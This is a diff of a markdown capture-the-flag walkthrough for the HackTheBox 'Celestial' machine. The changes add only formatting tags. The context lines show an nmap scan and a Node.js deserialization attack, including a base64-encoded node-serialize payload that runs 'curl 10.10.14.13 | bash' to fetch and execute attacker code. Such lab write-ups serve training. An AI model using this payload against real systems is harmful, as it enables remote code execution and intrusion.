@@ -8,6 +8,7 @@ tags: deserializationattack scripting bash python node.js cronjob reverseshell
 
 ![Machine-Icon](../../../assets/images/Celestial/Celestial.png)
 
+<br />
 
 OS -> Linux.
 
@@ -28,6 +29,8 @@ Without further ado, let's get to the first phase, the enumeration phase!
 <br />
 
 We start by running the typical nmap scan to see which ports are open:
+
+<br />
 
 ```bash
 ❯ nmap -p- 10.10.10.85 --open --min-rate 5000 -sS -T5 -Pn -n -sCV
@@ -91,9 +94,11 @@ eyJ1c2VybmFtZSI6IkNsZXZlciIsImNvdW50cnkiOiJUaGVCZXN0IiwiY2l0eSI6IkJhcmNlbG9uYSIs
 <br />
 
 We have been able! The server has interpreted the serialized data that we have sent it without any control. So if we build a malicious payload we can try to execute commands on the system.
+
 <br />
 
 ## Crafting a Malicious Serialized Payload:
+
 <br />
 
 To probe our theory, we are going to craft a payload to receive a curl from the victim machine in a localhost server hosted in our port 8082.
@@ -144,9 +149,11 @@ Once the IIFE has been entered, we store the data in a file and apply a base64 d
 ❯ cat data | base64 -w 0
 eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtcbiByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCAxMC4xMC4xNC4xMyB8IGJhc2gnLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTtcbiB9KCkifQoKCgoKCgoKCgoKCgoK
 ```
+
 <br />
 
 Now that we have the data, we go back to Burp Suite and replace the cookie, we set up a server with Python on port 8082, click on resend and... surprise!! We have received the curl from the Victim Machine!!
+
 <br />
 
 ![5](../../../assets/images/Celestial/5.png)
